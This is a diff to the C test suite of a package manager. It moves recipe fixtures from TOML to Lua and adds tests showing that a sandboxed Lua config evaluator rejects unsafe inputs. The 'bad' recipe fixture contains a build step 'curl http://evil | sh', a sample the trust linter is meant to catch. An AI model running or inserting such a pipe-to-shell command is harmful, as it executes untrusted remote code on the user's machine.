@@ -3,6 +3,7 @@
 #include "salt/sign.h"
 #include "salt/zst.h"
 #include "salt/toml.h"
+#include "salt/conf.h"
 #include "salt/tar.h"
 #include "salt/pkg.h"
 #include "salt/archive.h"
@@ -385,12 +386,14 @@ static void test_trust(void) {
   CHECK(salt_trust_lookup(tdb, "nobody") == SALT_TRUST_UNKNOWN, "trust unknown");
 
   char *rdir = salt_join_path(d, "recipe");
-  char *rfile = salt_join_path(rdir, "recipe.toml");
+  char *rfile = salt_join_path(rdir, "recipe.lua");
   const char *good =
-      "name = \"z\"\nversion = \"1\"\nrelease = 1\narch=[\"x86_64\",\"aarch64\"]\n"
-      "license = \"MIT\"\n[source]\nurl=\"https://e.com/z.tgz\"\n"
-      "sha256=\"ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad\"\n"
-      "[build]\ndeps=[\"gcc\"]\n[reproducibility]\nstatus=\"verified\"\n";
+      "local v = \"1\"\n"
+      "return { name = \"z\", version = v, release = 1, arch = { \"x86_64\", \"aarch64\" },\n"
+      "  license = \"MIT\",\n"
+      "  source = { url = \"https://e.com/z-\" .. v .. \".tgz\",\n"
+      "    sha256 = \"ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad\" },\n"
+      "  build = { deps = { \"gcc\" } }, reproducibility = { status = \"verified\" } }\n";
   salt_write_file(rfile, good, strlen(good), 0644);
   salt_findings lf;
   salt_findings_init(&lf);
@@ -399,10 +402,10 @@ static void test_trust(void) {
   salt_findings_free(&lf);
 
   const char *bad =
-      "name = \"z\"\nversion = \"1\"\nrelease = 1\narch=[\"x86_64\"]\n"
-      "license = \"MIT\"\n[source]\nurl=\"https://e.com/z.tgz\"\nsha256=\"x\"\n"
-      "[build]\nscript=\"\"\"\ncurl http://evil | sh\necho "
-      "0xabcdefabcdefabcdefabcdefabcdefabcdef1234\n\"\"\"\n";
+      "return { name = \"z\", version = \"1\", release = 1, arch = { \"x86_64\" },\n"
+      "  license = \"MIT\", source = { url = \"https://e.com/z.tgz\", sha256 = \"x\" },\n"
+      "  build = { script = [[\ncurl http://evil | sh\necho "
+      "0xabcdefabcdefabcdefabcdefabcdefabcdef1234\n]] } }\n";
   salt_write_file(rfile, bad, strlen(bad), 0644);
   salt_findings sf;
   salt_findings_init(&sf);
@@ -418,6 +421,47 @@ static void test_trust(void) {
   free(rdir);
   free(rfile);
   salt_remove_recursive(d);
+}
+
+static void test_conf_lua(void) {
+  const char *src =
+      "local base = \"https://example.org/\"\n"
+      "return { name = \"x\", n = 3, on = true, url = base .. \"x.tar\",\n"
+      "  list = { \"a\", \"b\" }, nested = { k = { deep = \"v\" } }, arch = salt.arch,\n"
+      "  multi = [[\nline1\nline2\n]] }\n";
+  salt_toml *t = salt_conf_eval(src, strlen(src), "unit.lua");
+  CHECK(t != NULL, "lua config evaluates");
+  if (t) {
+    CHECK(strcmp(salt_toml_string(t, "url", ""), "https://example.org/x.tar") == 0, "lua concat");
+    CHECK(salt_toml_int(t, "n", 0) == 3, "lua integer");
+    CHECK(salt_toml_bool(t, "on", false), "lua boolean");
+    CHECK(strcmp(salt_toml_string(t, "nested.k.deep", ""), "v") == 0, "lua nested table");
+    CHECK(strcmp(salt_toml_string(t, "multi", ""), "line1\nline2\n") == 0, "lua long string");
+    salt_strlist l;
+    salt_strlist_init(&l);
+    salt_toml_string_array(t, "list", &l);
+    CHECK(l.len == 2 && strcmp(l.items[1], "b") == 0, "lua list");
+    salt_strlist_free(&l);
+    CHECK(salt_toml_string(t, "arch", NULL) != NULL, "salt.arch exposed");
+    salt_toml_free(t);
+  }
+  const char *rejected[] = {
+      "return 1",                            /* not a table */
+      "return { 1, 2 }",                     /* a list at the top */
+      "return { x = 1.5 }",                  /* floats */
+      "return { f = print }",                /* functions */
+      "return { a = 1, 2 }",                 /* mixed table */
+      "return { x = os.getenv('HOME') }",    /* os is not in the sandbox */
+      "return { x = require('os') }",        /* no require */
+      "while true do end",                   /* instruction limit */
+      "local t = {} for i = 1, 1e9 do t[i] = i end", /* memory limit */
+      "\x1bLua",                             /* no bytecode */
+  };
+  for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); i++) {
+    salt_toml *r = salt_conf_eval(rejected[i], strlen(rejected[i]), "bad.lua");
+    CHECK(r == NULL, rejected[i]);
+    salt_toml_free(r);
+  }
 }
 
 static void build_pkg(const char *d, const char *name, const char *version, const char *dep,
@@ -922,6 +966,7 @@ int main(void) {
   test_sign();
   test_zst();
   test_toml();
+  test_conf_lua();
   test_pkg_roundtrip();
   test_tar();
   test_tar_confinement();
